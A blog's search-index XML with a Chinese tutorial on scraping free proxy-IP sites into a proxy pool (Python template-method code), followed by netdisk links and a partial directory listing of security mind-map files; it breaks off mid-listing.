<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>采集15个代理IP网站，打造免费代理IP池</title>
      <link href="/2023/09/16/%E9%87%87%E9%9B%8615%E4%B8%AA%E4%BB%A3%E7%90%86IP%E7%BD%91%E7%AB%99%EF%BC%8C%E6%89%93%E9%80%A0%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86IP%E6%B1%A0/"/>
      <url>/2023/09/16/%E9%87%87%E9%9B%8615%E4%B8%AA%E4%BB%A3%E7%90%86IP%E7%BD%91%E7%AB%99%EF%BC%8C%E6%89%93%E9%80%A0%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86IP%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>采集的站点：</strong></p><p>免费代理IP <a href="http://ip.yqie.com/ipproxy.htm">http://ip.yqie.com/ipproxy.htm</a><br>66免费代理网 <a href="http://www.66ip.cn/">http://www.66ip.cn/</a><br>89免费代理 <a href="http://www.89ip.cn/">http://www.89ip.cn/</a><br>无忧代理 <a href="http://www.data5u.com/">http://www.data5u.com/</a><br>云代理 <a href="http://www.ip3366.net/">http://www.ip3366.net/</a><br>快代理 <a href="https://www.kuaidaili.com/free/">https://www.kuaidaili.com/free/</a><br>极速专享代理 <a href="http://www.superfastip.com/">http://www.superfastip.com/</a><br>HTTP代理IP <a href="https://www.xicidaili.com/wt/">https://www.xicidaili.com/wt/</a><br>小舒代理 <a href="http://www.xsdaili.com/">http://www.xsdaili.com</a><br>西拉免费代理IP <a href="http://www.xiladaili.com/">http://www.xiladaili.com/</a><br>小幻HTTP代理 <a href="https://ip.ihuan.me/">https://ip.ihuan.me/</a><br>全网代理IP <a href="http://www.goubanjia.com/">http://www.goubanjia.com/</a><br>飞龙代理IP <a href="http://www.feilongip.com/">http://www.feilongip.com/</a></p><p><strong>采集流程</strong></p><p>第一步：获取页面内容</p><p>第二步：解析内容获取数据</p><p>第三步：数据格式转换</p><p>采集流程定制好了之后，把他创建为抽象类 让所有站点去继承它, 子类只需要去实现抽象方法。这是一个比较典型的<strong>模板模式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"><span class="keyword">from</span> .model <span class="keyword">import</span> ProxyModel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AbsFreeProxyBase</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">    <span class="comment"># 请求</span></span><br><span class="line">    http = requests</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, code, **kwargs</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param url: 请求地址</span></span><br><span class="line"><span class="string">        :param code: 页面编码</span></span><br><span class="line"><span class="string">        :param kw: 附加信息</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.code = code</span><br><span class="line">        self.kwargs = kwargs</span><br><span class="line">        self.beautifulsoup = bs4.BeautifulSoup</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模板方法模式</span></span><br><span class="line">    <span class="comment"># 第一步 获取页面内容  第二步 解析内容  第二步 格式化数据</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[ProxyModel]:</span><br><span class="line">        text = self.get_page_text()</span><br><span class="line">        soup = self.beautifulsoup(text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        data = self.parse_text(soup)</span><br><span class="line">        <span class="keyword">return</span> self.to_proxy(data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page_text</span>(<span class="params">self</span>):</span><br><span class="line">        res = AbsFreeProxyBase.http.get(self.url, **self.kwargs)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> res.ok:</span><br><span class="line">            res.raise_for_status()</span><br><span class="line">        <span class="keyword">return</span> res.content.decode(self.code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析内容</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_text</span>(<span class="params">self, soup: bs4.BeautifulSoup</span>) -&gt; <span class="type">List</span>[<span class="built_in">list</span>]:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 格式转换</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_proxy</span>(<span class="params">self, data:<span class="type">List</span>[<span class="built_in">list</span>]</span>) -&gt; <span class="type">List</span>[ProxyModel]:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>如：快代理网站</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .base <span class="keyword">import</span> AbsFreeProxyBase</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> .model <span class="keyword">import</span> ProxyModel</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">快代理</span></span><br><span class="line"><span class="string">https://www.kuaidaili.com/free</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WWW_KUAIDAILI_COM</span>(<span class="title class_ inherited__">AbsFreeProxyBase</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, code=<span class="string">&#x27;utf-8&#x27;</span>, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(url, code, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析内容</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_text</span>(<span class="params">self, soup</span>) -&gt; <span class="type">List</span>[<span class="built_in">list</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        格式如下：</span></span><br><span class="line"><span class="string">        IP     port(端口)     匿名度     类型(HTTP/https)     位置     响应速度     最后验证时间</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        regex = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;td[^&gt;]*&gt;([^&lt;&gt;]+)&lt;/td&gt;&#x27;</span>)</span><br><span class="line">        rows = soup.select(<span class="string">&#x27;.table-bordered tr&#x27;</span>)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> [<span class="built_in">str</span>(n) <span class="keyword">for</span> n <span class="keyword">in</span> rows]:</span><br><span class="line">            item = regex.findall(row)</span><br><span class="line">            item <span class="keyword">and</span> result.append(item)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 格式转换</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">to_proxy</span>(<span class="params">self, data: <span class="type">List</span>[<span class="built_in">list</span>]</span>) -&gt; <span class="type">List</span>[ProxyModel]:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">            result.append(ProxyModel(item[<span class="number">3</span>], item[<span class="number">0</span>], item[<span class="number">1</span>], item[<span class="number">2</span>]))</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>应用实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">from website import ProxyFactory</span><br><span class="line">from browser.agent import useragent</span><br><span class="line"></span><br><span class="line">factory = ProxyFactory()</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;user-agent&#x27;: useragent.random()</span><br><span class="line">&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">66免费代理网</span><br><span class="line">www = factory.create(&#x27;http://www.66ip.cn/mo.php?sxb=&amp;tqsl=100&amp;port=&amp;export=&amp;ktip=&amp;sxa=&amp;submit=%CC%E1++%C8%A1&amp;textarea=&#x27;,</span><br><span class="line">                     &#x27;gbk&#x27;,</span><br><span class="line">                     headers=headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">小幻HTTP代理 </span><br><span class="line">www = factory.create(&#x27;https://ip.ihuan.me/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">89免费代理 http://www.89ip.cn/</span><br><span class="line">www = factory.create(&#x27;http://www.89ip.cn/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">无忧代理 http://www.data5u.com/</span><br><span class="line">www = factory.create(&#x27;http://www.data5u.com/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">http://www.goubanjia.com/</span><br><span class="line">全网代理IP </span><br><span class="line">www = factory.create(&#x27;http://www.goubanjia.com/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">云代理 http://www.ip3366.net/</span><br><span class="line">www = factory.create(&#x27;http://www.ip3366.net/&#x27;,&#x27;gbk&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">快代理</span><br><span class="line">https://www.kuaidaili.com/free</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">www = factory.create(&#x27;https://www.kuaidaili.com/free&#x27;,headers = headers)</span><br><span class="line">data = www.run()</span><br><span class="line"></span><br><span class="line">print(data)from website import ProxyFactory</span><br><span class="line">from browser.agent import useragent</span><br><span class="line"></span><br><span class="line">factory = ProxyFactory()</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;user-agent&#x27;: useragent.random()</span><br><span class="line">&#125;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">66免费代理网</span><br><span class="line">www = factory.create(&#x27;http://www.66ip.cn/mo.php?sxb=&amp;tqsl=100&amp;port=&amp;export=&amp;ktip=&amp;sxa=&amp;submit=%CC%E1++%C8%A1&amp;textarea=&#x27;,</span><br><span class="line">                     &#x27;gbk&#x27;,</span><br><span class="line">                     headers=headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">小幻HTTP代理 </span><br><span class="line">www = factory.create(&#x27;https://ip.ihuan.me/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">89免费代理 http://www.89ip.cn/</span><br><span class="line">www = factory.create(&#x27;http://www.89ip.cn/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">无忧代理 http://www.data5u.com/</span><br><span class="line">www = factory.create(&#x27;http://www.data5u.com/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">http://www.goubanjia.com/</span><br><span class="line">全网代理IP </span><br><span class="line">www = factory.create(&#x27;http://www.goubanjia.com/&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">云代理 http://www.ip3366.net/</span><br><span class="line">www = factory.create(&#x27;http://www.ip3366.net/&#x27;,&#x27;gbk&#x27;,headers = headers)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">快代理</span><br><span class="line">https://www.kuaidaili.com/free</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">www = factory.create(&#x27;https://www.kuaidaili.com/free&#x27;,headers = headers)</span><br><span class="line">data = www.run()</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>思维导图</title>
      <link href="/2023/08/31/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E9%9B%86%E5%90%88/"/>
      <url>/2023/08/31/%E5%AE%89%E5%85%A8%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<p>网盘地址： <a href="https://www.123pan.com/s/4o6VVv-cynHA.html">https://www.123pan.com/s/4o6VVv-cynHA.html</a><br>       链接：<a href="https://pan.baidu.com/s/18V8r3Ce6sgcJ232lrmDb0Q?pwd=8iyi">https://pan.baidu.com/s/18V8r3Ce6sgcJ232lrmDb0Q?pwd=8iyi</a><br>       提取码：8iyi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line">    │   .</span><br><span class="line">    │   ├── APT 攻击</span><br><span class="line">    │   ├── APT 攻击.png</span><br><span class="line">    │   ├── 深度分析.jpg</span><br><span class="line">    │   ├── 发现与影响评估.jpg</span><br><span class="line">    │   ├── 网络攻击与防御图谱.jpeg</span><br><span class="line">    │   └── 网络攻击与防范图谱.jpeg</span><br><span class="line">    ├── CTF资料</span><br><span class="line">    │   ├── CTF攻防部署.png</span><br><span class="line">    │   └── CTF题目工具资源.png</span><br><span class="line">    ├── README.md</span><br><span class="line">    ├── Web安全</span><br><span class="line">    │   ├── JavaWeb简介.png</span><br><span class="line">    │   ├── Jboss引起的内网渗透.png</span><br><span class="line">    │   ├── Maltego使用导图.jpg</span><br><span class="line">    │   ├── Nmap.png</span><br><span class="line">    │   ├── PHP源码审计.png</span><br><span class="line">    │   ├── PTES_MindMap_CN1.pdf</span><br><span class="line">    │   ├── Python系统审计.jpg</span><br><span class="line">    │   ├── WEB2HACK.jpg</span><br><span class="line">    │   ├── Web 架构中的安全问题.png</span><br><span class="line">    │   ├── Web安全.png</span><br><span class="line">    │   ├── Web安全技术点.jpg</span><br><span class="line">    │   ├── Web指纹分析方法.png</span><br><span class="line">    │   ├── Web服务器入侵防御.jpg</span><br><span class="line">    │   ├── Web攻击及防御技术.png</span><br><span class="line">    │   ├── XSS利用架构图.jpg</span><br><span class="line">    │   ├── XSS攻击点汇总.png</span><br><span class="line">    │   ├── nmap.jpg</span><br><span class="line">    │   ├── pentest_method.jpg</span><br><span class="line">    │   ├── pentester.jpg</span><br><span class="line">    │   ├── powershell语法.png</span><br><span class="line">    │   ├── web渗透.jpg</span><br><span class="line">    │   ├── web应用测试.jpg</span><br><span class="line">    │   ├── xml安全汇总.png</span><br><span class="line">    │   ├── 渗透标准.jpg</span><br><span class="line">    │   ├── 渗透流程.jpg</span><br><span class="line">    │   ├── 进阶渗透.png</span><br><span class="line">    │   ├── 社会工程学.jpg</span><br><span class="line">    │   ├── 网站入侵图.jpg</span><br><span class="line">    │   ├── 安全漏洞总结.jpg</span><br><span class="line">    │   ├── 渗透测试流程.jpg</span><br><span class="line">    │   ├── 域名搜集途径.png</span><br><span class="line">    │   ├── 网络安全绪论.png</span><br><span class="line">    │   ├── 渗透测试实验室.jpg</span><br><span class="line">    │   ├── 渗透测试详细版.jpg</span><br><span class="line">    │   ├── 黑客入侵行为分析.gif</span><br><span class="line">    │   ├── 主流测试工具分类.jpg</span><br><span class="line">    │   ├── 系统端口审计琐事.jpg</span><br><span class="line">    │   └── 密码找回逻辑漏洞总结.png</span><br><span class="line">    ├── 业务安全</span><br><span class="line">    │   ├── P2P-security.png</span><br><span class="line">    │   ├── SEO导图.gif</span><br><span class="line">    │   ├── 业务安全.jpg</span><br><span class="line">    │   ├── 黑色产业.jpg</span><br><span class="line">    │   ├── 业务安全1.jpg</span><br><span class="line">    │   ├── 业务安全测试点.jpg</span><br><span class="line">    │   ├── 黑色产业链示意图.pdf</span><br><span class="line">    │   └── 网游安全运营管理体系.jpg</span><br><span class="line">    ├── 人工智能</span><br><span class="line">    │   ├── AI 与安全.jpeg</span><br><span class="line">    │   ├── Cyber-Analytics-Based-on-Models-Algorithms-V2-1024x555.webp</span><br><span class="line">    │   ├── kaggle-特征工程.png</span><br><span class="line">    │   ├── 人工智能.jpg</span><br><span class="line">    │   ├── 数学基础.jpg</span><br><span class="line">    │   ├── 机器学习.jpg</span><br><span class="line">    │   ├── 深度学习.jpg</span><br><span class="line">    │   └── 安全三象限.jpg</span><br><span class="line">    ├── 其它相关</span><br><span class="line">    │   ├── 2012sec_event.jpg</span><br><span class="line">    │   ├── 2018年信息安全从业者书单推荐.jpg</span><br><span class="line">    │   ├── SEO-Cheatsheet.png</span><br><span class="line">    │   ├── amazon云安全体系.jpg</span><br><span class="line">    │   ├── infosec.svg</span><br><span class="line">    │   ├── 网络安全全景图.jpg</span><br><span class="line">    │   ├── 首席安全官技能图.jpg</span><br><span class="line">    │   ├── 舆情监测业务架构.png</span><br><span class="line">    │   ├── 中国黑阔技术金字塔.png</span><br><span class="line">    │   └── 网络安全发展与未来.png</span><br><span class="line">    ├── 安全开发</span><br><span class="line">    │   ├── Cheatsheet_OWASPCheckList.png</span><br><span class="line">    │   ├── LAMPer技能树.jpeg</span><br><span class="line">    │   ├── Python 知识点.jpg</span><br><span class="line">    │   ├── QM--Python.png</span><br><span class="line">    │   ├── python_regrex.png</span><br><span class="line">    │   ├── vi.jpg</span><br><span class="line">    │   ├── vim2.jpg</span><br><span class="line">    │   ├── wyscan设计结构.png</span><br><span class="line">    │   ├── 机器学习 .png</span><br><span class="line">    │   ├── 网站架构.jpg</span><br><span class="line">    │   ├── 爬虫技能树-总览图1.png</span><br><span class="line">    │   ├── 常见的测试类型.jpg</span><br><span class="line">    │   ├── 扫描与防御技术.png</span><br><span class="line">    │   ├── 网络监听与防御技术.png</span><br><span class="line">    │   └── 信息系统整体安全生命周期设计.jpg</span><br><span class="line">    ├── 安全职业</span><br><span class="line">    │   └── 信息安全从业人员职业规划.jpg</span><br><span class="line">    ├── 安全论文</span><br><span class="line">    │   └── 信息安全相关会议期刊.jpg</span><br><span class="line">    ├── 工控安全</span><br><span class="line">    │   ├── IoT产品安全评估.png</span><br><span class="line">    │   ├── 智能设备.png</span><br><span class="line">    │   ├── 工控安全案例.pdf</span><br><span class="line">    │   ├── 工控安全防护体系.png</span><br><span class="line">    │   └── 工控系统安全及应对.jpg</span><br><span class="line">    ├── 态势感知</span><br><span class="line">    │   ├── 安天框架.jpg</span><br><span class="line">    │   └── 天融信框架.jpg</span><br><span class="line">    ├── 恶意分析</span><br><span class="line">    │   ├── KaiXin-EK-1.1.png</span><br><span class="line">    │   ├── apt22.png</span><br><span class="line">    │   ├── exploit.jpg</span><br><span class="line">    │   ├── java_exploit_.png</span><br><span class="line">    │   ├── malware_pdf.jpg</span><br><span class="line">    │   └── styx-New2_2013.jpg</span><br><span class="line">    ├── 情报分析</span><br><span class="line">    │   ├── 2017_ExploitKits.png</span><br><span class="line">    │   ├── QQ20181021-231344.jpg</span><br><span class="line">    │   ├── Unnamed file.jpg</span><br><span class="line">    │   ├── diamond_threat_model.png</span><br><span class="line">    │   ├── threat_diamond_model.png</span><br><span class="line">    │   ├── 情报分析.jpg</span><br><span class="line">    │   ├── 诈骗取证.jpg</span><br><span class="line">    │   ├── 威胁建模.png</span><br><span class="line">    │   └── 习科技能表.jpg</span><br><span class="line">    ├── 数据分析</span><br><span class="line">    │   └── 天融信大数据分析平台.jpg</span><br><span class="line">    ├── 数据安全</span><br><span class="line">    │   ├── 数据安全风险.png</span><br><span class="line">    │   └── 数据安全与防护.png</span><br><span class="line">    ├── 无线安全</span><br><span class="line">    │   ├── WiFi渗透流程.png</span><br><span class="line">    │  